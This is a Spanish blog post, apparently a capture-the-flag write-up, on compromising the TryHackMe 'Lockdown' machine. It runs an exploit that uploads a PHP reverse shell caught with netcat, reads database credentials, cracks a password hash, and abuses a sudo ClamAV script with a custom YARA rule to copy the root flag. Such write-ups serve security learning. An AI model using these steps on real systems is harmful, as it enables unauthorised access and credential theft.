<!doctype html><html lang=es>
<head>
<title>
Lockdown - Write Up - Español ::
Lanfran02 - Blog — Hackeando tu forma de aprender.
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Nivel Creador     Aquí Medio hangrymoose    Reconocimiento ¡Ey! ¡Bienvenido de nuevo!
Una vez más, estamos ejecutando nmap contra esta máquina, ¡para ver qué servicios se están ejecutando!
╰─ lanfran@parrot ❯ sudo nmap 10.10.51.197 -p- -sS --min-rate 5000 -n -Pn ─╯ [sudo] password for lanfran: Host discovery disabled (-Pn). All addresses will be marked &amp;#39;up&amp;#39; and scan times will be slower. Starting Nmap 7.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/es/posts/lockdown/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/es/posts/lockdown/cover.jpeg">
<meta name=twitter:title content="Lockdown - Write Up - Español">
<meta name=twitter:description content="Máquina de nivel medio en TryHackMe.">
<meta property="og:title" content="Lockdown - Write Up - Español">
<meta property="og:description" content="Máquina de nivel medio en TryHackMe.">
<meta property="og:type" content="article">
<meta property="og:url" content="/es/posts/lockdown/"><meta property="og:image" content="/es/posts/lockdown/cover.jpeg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-10-23T13:13:28+02:00">
<meta property="article:modified_time" content="2021-10-23T13:13:28+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/es/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li>
<ul class="menu__sub-inner-more hidden">
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</ul>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>Lockdown - Write Up - Español</h1>
<div class=post-meta>
<span class=post-date>
2021-10-23
</span>
<span class=post-author>— Escrito por Lanfran02</span>
<span class=post-read-time>— 7 mins lectura</span>
</div>
<span class=post-tags>
<a href=/tags/sqli/>#SQLi</a>&nbsp;
<a href=/tags/rce/>#RCE</a>&nbsp;
<a href=/tags/yara/>#YARA</a>&nbsp;
<a href=/tags/sudo/>#sudo</a>&nbsp;
<a href=/tags/mysql/>#MySQL</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/es/posts/lockdown/cover.jpeg alt="Lockdown - Write Up - Español">
</figure>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconocimiento>Reconocimiento</a></li>
<li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li>
<li><a href=#raíz>Raíz</a></li>
</ul>
</nav></aside>
<table>
<thead>
<tr>
<th>Link</th>
<th>Nivel</th>
<th>Creador</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=https://tryhackme.com/room/lockdown>Aquí</a></td>
<td>Medio</td>
<td><a href=https://tryhackme.com/p/hangrymoose>hangrymoose</a></td>
</tr>
</tbody>
</table>
<h2 id=reconocimiento>Reconocimiento</h2>
<p>¡Ey! ¡Bienvenido de nuevo!</p>
<p>Una vez más, estamos ejecutando <code>nmap</code> contra esta máquina, ¡para ver qué servicios se están ejecutando!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sudo nmap 10.10.51.197 -p- -sS --min-rate <span style=color:#ae81ff>5000</span> -n -Pn                                                         ─╯
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Host discovery disabled <span style=color:#f92672>(</span>-Pn<span style=color:#f92672>)</span>. All addresses will be marked <span style=color:#e6db74>&#39;up&#39;</span> and scan times will be slower.
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-10-23 10:02 CEST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.51.197
Host is up <span style=color:#f92672>(</span>0.072s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>65533</span> filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 27.18 seconds
</code></pre></div><p>Máquina simple por ahora, 2 puertos abiertos <code>22</code> ejecutando <code>ssh</code> y el <code>80</code> ejecutando una <code>web</code>.</p>
<p>¡Vamos a la web!</p>
<p>Si intenta ir directamente a la IP de la máquina, probablemente verá esto:</p>
<p><img src=hosts.png alt=hosts></p>
<p>Porque tenemos que agregar la siguiente línea a nuestro archivo <code>/etc/hosts</code>:</p>
<p><code>{MACHINE_IP} contacttracer.thm</code></p>
<p><em>Edita <code>{MACHINE_IP}</code> con la IP de la máquina.</em></p>
<p>Después de eso, podemos ir a la página.</p>
<p><img src=page.png alt=página></p>
<p>Podemos ver una página normal, un <code>Contact Tracer</code> para el Coronavirus, muy útil en esta situación de pandemia&mldr;</p>
<p>¡Tenemos un inicio de sesión de administradores! Tal vez podamos explotar un <code>SQLi</code> como este &mldr;</p>
<p><img src=sql.png alt=sql></p>
<p>¡Y lo logramos!</p>
<p>Podemos ver una panel de administración, lo interesante esta en la parte inferior derecha:</p>
<p><img src=version.png alt=versión></p>
<p>Tenemos la versión de esta plataforma, ¡y ahora podemos buscar un exploit público!</p>
<p>Eso lo encontramos <a href=https://www.exploit-db.com/exploits/49604>aquí</a>. También modifiqué un poco este exploit para tener una mejor shell, puedes encontrarlo <a href=exp.py>aquí</a></p>
<p>¡Así que ejecutemos el exploit!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#f92672>[</span>Terminal 1<span style=color:#f92672>]</span>

╰─ lanfran@parrot ❯ python3 exp.py contacttracer.thm 10.9.2.74 <span style=color:#ae81ff>1337</span>                                                                ─╯
<span style=color:#f92672>(</span>+<span style=color:#f92672>)</span> Uploading php reverse shell..
<span style=color:#f92672>(</span>+<span style=color:#f92672>)</span> File upload seems to have been successful!
<span style=color:#f92672>(</span>+<span style=color:#f92672>)</span> Now trying to trigger our shell..

<span style=color:#f92672>(</span>+<span style=color:#f92672>)</span> <span style=color:#66d9ef>done</span>!


-----------

<span style=color:#f92672>[</span>Terminal 2<span style=color:#f92672>]</span>


╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                  ─╯
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
connect to <span style=color:#f92672>[</span>10.9.2.74<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.51.197<span style=color:#f92672>]</span> <span style=color:#ae81ff>55832</span>
Linux lockdown 4.15.0-151-generic <span style=color:#75715e>#157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
 10:17:55 up <span style=color:#ae81ff>43</span> min,  <span style=color:#ae81ff>0</span> users,  load average: 0.00, 0.00, 0.27
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
sh: cannot set terminal process group <span style=color:#f92672>(</span>993<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
sh: no job control in this shell
sh-4.4$ id
id
uid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>33<span style=color:#f92672>(</span>www-data<span style=color:#f92672>)</span>
</code></pre></div><p>¡Estamos dentro!</p>
<h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2>
<p>Estamos dentro, pero no podemos leer la bandera del usuario.</p>
<p>Así que buscando archivos interesantes, ¡encontré las credenciales de una conexión mysql!</p>
<p>¡Podemos usarlos para iniciar sesión en el servidor <code>mysql</code>!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@lockdown:/tmp$ cat /var/www/html/classes/DBConnection.php 
&lt;?php
class DBConnection<span style=color:#f92672>{</span>

    private $host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;localhost&#39;</span>;
    private $username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;cts&#39;</span>;
    private $password <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Y[REDACTADO]E&#39;</span>;
    private $database <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;cts_db&#39;</span>;
    
    public $conn;
    
    public <span style=color:#66d9ef>function</span> __construct<span style=color:#f92672>(){</span>

        <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!isset<span style=color:#f92672>(</span>$this-&gt;conn<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
            
            $this-&gt;conn <span style=color:#f92672>=</span> new mysqli<span style=color:#f92672>(</span>$this-&gt;host, $this-&gt;username, $this-&gt;password, $this-&gt;database<span style=color:#f92672>)</span>;
            
            <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!$this-&gt;conn<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
                echo <span style=color:#e6db74>&#39;Cannot connect to database server&#39;</span>;
                exit;
            <span style=color:#f92672>}</span>            
        <span style=color:#f92672>}</span>    
        
    <span style=color:#f92672>}</span>
    public <span style=color:#66d9ef>function</span> __destruct<span style=color:#f92672>(){</span>
        $this-&gt;conn-&gt;close<span style=color:#f92672>()</span>;
    <span style=color:#f92672>}</span>
<span style=color:#f92672>}</span>
www-data@lockdown:/tmp$ mysql -u cts -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or <span style=color:#ae81ff>\g</span>.
Your MySQL connection id is <span style=color:#ae81ff>461</span>
Server version: 5.7.35-0ubuntu0.18.04.1 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>

Copyright <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span style=color:#e6db74>&#39;help;&#39;</span> or <span style=color:#e6db74>&#39;\h&#39;</span> <span style=color:#66d9ef>for</span> help. Type <span style=color:#e6db74>&#39;\c&#39;</span> to clear the current input statement.

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| cts_db             |
+--------------------+
<span style=color:#ae81ff>2</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>

mysql&gt; use cts_db;
Reading table information <span style=color:#66d9ef>for</span> completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&gt; show tables;
+------------------+
| Tables_in_cts_db |
+------------------+
| barangay_list    |
| city_list        |
| establishment    |
| people           |
| state_list       |
| system_info      |
| tracks           |
| users            |
+------------------+
<span style=color:#ae81ff>8</span> rows in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>

mysql&gt; <span style=color:#66d9ef>select</span> * from users;
+----+--------------+----------+----------+--------------+-------------------------------+------------+---------------------+---------------------+
| id | firstname    | lastname | username | password     | avatar                        | last_login | date_added          | date_updated        |
+----+--------------+----------+----------+--------------+-------------------------------+------------+---------------------+---------------------+
|  <span style=color:#ae81ff>1</span> | Adminstrator | Admin    | admin    | 3<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>d | uploads/1614302940_avatar.jpg | NULL       | 2021-01-20 14:02:37 | 2021-02-26 10:23:23 |
+----+--------------+----------+----------+--------------+-------------------------------+------------+---------------------+---------------------+
<span style=color:#ae81ff>1</span> row in set <span style=color:#f92672>(</span>0.00 sec<span style=color:#f92672>)</span>

mysql&gt; 
</code></pre></div><p>¡Y ahora tenemos una contraseña hasheada!</p>
<p>¡Tenemos muchas formas de &ldquo;dehashearla&rdquo;!</p>
<p>Voy a usar <code>STH (Search That Hash)</code>. Pero puedes usar <code>crackstation</code> o incluso <code>john</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>
╰─ lanfran@parrot ❯ sth --text <span style=color:#e6db74>&#34;3[REDACTADO]d&#34;</span>                                                                  ─╯

  _____                     _        _______ _           _          _    _           _
 / ____|                   | |      |__   __| |         | |        | |  | |         | |
| <span style=color:#f92672>(</span>___   ___  __ _ _ __ ___| |__ ______| |  | |__   __ _| |_ ______| |__| | __ _ ___| |__
 <span style=color:#ae81ff>\_</span>__ <span style=color:#ae81ff>\ </span>/ _ <span style=color:#ae81ff>\/</span> _<span style=color:#e6db74>`</span> | <span style=color:#e6db74>&#39;__/ __| &#39;</span>_ <span style=color:#ae81ff>\_</span>_____| |  | <span style=color:#e6db74>&#39;_ \ / _` | __|______|  __  |/ _` / __| &#39;</span>_ <span style=color:#ae81ff>\
</span><span style=color:#ae81ff></span> ____<span style=color:#f92672>)</span> |  __/ <span style=color:#f92672>(</span>_| | | | <span style=color:#f92672>(</span>__| | | |     | |  | | | | <span style=color:#f92672>(</span>_| | |_       | |  | | <span style=color:#f92672>(</span>_| <span style=color:#ae81ff>\_</span>_ <span style=color:#ae81ff>\ </span>| | |
|_____/ <span style=color:#ae81ff>\_</span>__|<span style=color:#ae81ff>\_</span>_,_|_|  <span style=color:#ae81ff>\_</span>__|_| |_|     |_|  |_| |_|<span style=color:#ae81ff>\_</span>_,_|<span style=color:#ae81ff>\_</span>_|      |_|  |_|<span style=color:#ae81ff>\_</span>_,_|___/_| |_|
        
https://twitter.com/bee_sec_san
https://github.com/HashPals/Search-That-Hash
https://twitter.com/Jayy_2004


3<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>d

Text : s<span style=color:#f92672>[</span>REDACTADO<span style=color:#f92672>]</span>m
Type : MD5
</code></pre></div><p>¡Ahora tenemos la contraseña en texto plano!</p>
<p>Veamos si algún usuario reutilizó esta contraseña &mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>www-data@lockdown:/home$ su cyrus
Password: 
cyrus@lockdown:/home$ cat /home/cyrus/user.txt 
THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
</code></pre></div><p>Afortunadamente para nosotros, el usuario <code>cyrus</code> reutilizó la contraseña y ahora tenemos la flag del usuario.</p>
<h2 id=raíz>Raíz</h2>
<p>Para obtener la flag de root, tenemos que seguir un camino interesante&mldr;</p>
<p>Primero, podemos ejecutar un script con <code>sudo</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cyrus@lockdown:/home$ sudo -l
Matching Defaults entries <span style=color:#66d9ef>for</span> cyrus on lockdown:
    env_reset, mail_badpass,
    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

User cyrus may run the following commands on lockdown:
    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /opt/scan/scan.sh
cyrus@lockdown:/home$
</code></pre></div><p>Al leer este script, se activará un escaneo en la ruta que le demos&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cyrus@lockdown:/home$ cat /opt/scan/scan.sh
<span style=color:#75715e>#!/bin/bash</span>

read -p <span style=color:#e6db74>&#34;Enter path: &#34;</span> TARGET

<span style=color:#66d9ef>if</span> <span style=color:#f92672>[[</span> -e <span style=color:#e6db74>&#34;</span>$TARGET<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>&amp;&amp;</span> -r <span style=color:#e6db74>&#34;</span>$TARGET<span style=color:#e6db74>&#34;</span> <span style=color:#f92672>]]</span>
  <span style=color:#66d9ef>then</span>
    /usr/bin/clamscan <span style=color:#e6db74>&#34;</span>$TARGET<span style=color:#e6db74>&#34;</span> --copy<span style=color:#f92672>=</span>/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  <span style=color:#66d9ef>else</span>
    echo <span style=color:#e6db74>&#34;Invalid or inaccessible path.&#34;</span>
<span style=color:#66d9ef>fi</span>
cyrus@lockdown:/home$
</code></pre></div><p>Buscando en la máquina, podemos ver que para buscar &ldquo;virus&rdquo; en un archivo, la secuencia de comandos verificará una base de datos.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cyrus@lockdown:/home$ cat /etc/clamav/freshclam.conf 
<span style=color:#75715e># Automatically created by the clamav-freshclam postinst</span>
<span style=color:#75715e># Comments will get lost when you reconfigure the clamav-freshclam package</span>

DatabaseOwner clamav
UpdateLogFile /var/log/clamav/freshclam.log
LogVerbose false
LogSyslog false
LogFacility LOG_LOCAL6
LogFileMaxSize <span style=color:#ae81ff>0</span>
LogRotate true
LogTime true
Foreground false
Debug false
MaxAttempts <span style=color:#ae81ff>5</span>
DatabaseDirectory /var/lib/clamav                   &lt;----- Aquí
DNSDatabaseInfo current.cvd.clamav.net
ConnectTimeout <span style=color:#ae81ff>30</span>
ReceiveTimeout <span style=color:#ae81ff>30</span>
TestDatabases yes
ScriptedUpdates yes
CompressLocalDatabase no
SafeBrowsing false
Bytecode true
NotifyClamd /etc/clamav/clamd.conf
<span style=color:#75715e># Check for new database 24 times a day</span>
Checks <span style=color:#ae81ff>24</span>
DatabaseMirror db.local.clamav.net
DatabaseMirror database.clamav.net
cyrus@lockdown:/home$
</code></pre></div><p>Y aquí tenemos las Bases de Datos&mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cyrus@lockdown:/home$ ls -la /var/lib/clamav
total <span style=color:#ae81ff>20</span>
drwxrwxrwx  <span style=color:#ae81ff>2</span> clamav clamav <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>23</span> 11:00 .
drwxr-xr-x <span style=color:#ae81ff>45</span> root   root   <span style=color:#ae81ff>4096</span> Jul <span style=color:#ae81ff>30</span> 20:30 ..
-rw-r--r--  <span style=color:#ae81ff>1</span> root   root     <span style=color:#ae81ff>46</span> Jul <span style=color:#ae81ff>23</span> 20:07 main.hdb
-rw-r--r--  <span style=color:#ae81ff>1</span> root   root     <span style=color:#ae81ff>69</span> May <span style=color:#ae81ff>11</span> 04:26 mirrors.dat
cyrus@lockdown:/home$
</code></pre></div><p>Entonces, para verificar si hay virus está usando las <code>reglas de YARA</code> &mldr; Puede leer más sobre esto en este <a href=https://blog.malwarebytes.com/security-world/technology/2017/09/explained-yara-rules/>enlace</a>.</p>
<p>Pero básicamente podemos crear nuestra propia regla <code>YARA</code> para leer la bandera de la raíz, así:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cyrus@lockdown:/tmp$ cat rule.yar
rule PWNED
<span style=color:#f92672>{</span>
  strings:
    $a <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;root&#34;</span>
    $b <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;THM&#34;</span>
    
  condition:
    $b or $a
<span style=color:#f92672>}</span>
</code></pre></div><p>Esta regla buscará cualquier archivo con THM o raíz de &ldquo;strings&rdquo;.</p>
<p>Ahora copiemos esta regla en la carpeta donde el script busca las bases de datos y las reglas &mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cyrus@lockdown:/tmp$ cd /var/lib/clamav
cyrus@lockdown:/var/lib/clamav$ ls -la
total <span style=color:#ae81ff>16</span>
drwxrwxrwx  <span style=color:#ae81ff>2</span> clamav clamav <span style=color:#ae81ff>4096</span> Oct <span style=color:#ae81ff>23</span> 10:47 .
drwxr-xr-x <span style=color:#ae81ff>45</span> root   root   <span style=color:#ae81ff>4096</span> Jul <span style=color:#ae81ff>30</span> 20:30 ..
-rw-r--r--  <span style=color:#ae81ff>1</span> root   root     <span style=color:#ae81ff>46</span> Jul <span style=color:#ae81ff>23</span> 20:07 main.hdb
-rw-r--r--  <span style=color:#ae81ff>1</span> root   root     <span style=color:#ae81ff>69</span> May <span style=color:#ae81ff>11</span> 04:26 mirrors.dat
cyrus@lockdown:/var/lib/clamav$ cp /tmp/rule.yar .
</code></pre></div><p>Genial, ahora ejecutemos el script con sudo, ¡y usemos la ruta a la flag de root!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cyrus@lockdown:/var/lib/clamav$ sudo /opt/scan/scan.sh
Enter path: /root/root.txt
/root/root.txt: YARA.CheckFileName.UNOFFICIAL FOUND
/root/root.txt: copied to <span style=color:#e6db74>&#39;/home/cyrus/quarantine/root.txt&#39;</span>

----------- SCAN SUMMARY -----------
Known viruses: <span style=color:#ae81ff>2</span>
Engine version: 0.103.2
Scanned directories: <span style=color:#ae81ff>0</span>
Scanned files: <span style=color:#ae81ff>1</span>
Infected files: <span style=color:#ae81ff>1</span>
Data scanned: 0.00 MB
Data read: 0.00 MB <span style=color:#f92672>(</span>ratio 0.00:1<span style=color:#f92672>)</span>
Time: 0.018 sec <span style=color:#f92672>(</span><span style=color:#ae81ff>0</span> m <span style=color:#ae81ff>0</span> s<span style=color:#f92672>)</span>
Start Date: 2021:10:23 11:00:49
End Date:   2021:10:23 11:00:49
</code></pre></div><p>¡El exploit funcionó como se esperaba! Ahora tenemos un archivo en &ldquo;cuarentena&rdquo;, ¡y este archivo es la bandera de la raíz! ¡¡¡Así que vamos a leerlo !!!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cyrus@lockdown:/var/lib/clamav$ cat /home/cyrus/quarantine/root.txt
THM<span style=color:#f92672>{[</span>REDACTADO<span style=color:#f92672>]}</span>
</code></pre></div><p>¡Y hemos rooteado la máquina!</p>
<p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Leer otros posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=/es/posts/palsforlife/>
<span class=button__icon>←</span>
<span class=button__text>Pals For Life - Write Up - Español</span>
</a>
</span>
<span class="button next">
<a href=/es/posts/zeno/>
<span class=button__text>Zeno - Write Up - Español</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
<div id=hyvor-talk-view></div>
<script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
<script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div>
</div>
</footer>
<script src=/assets/main.js></script>
<script src=/assets/prism.js></script>
</div>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
</body>
</html>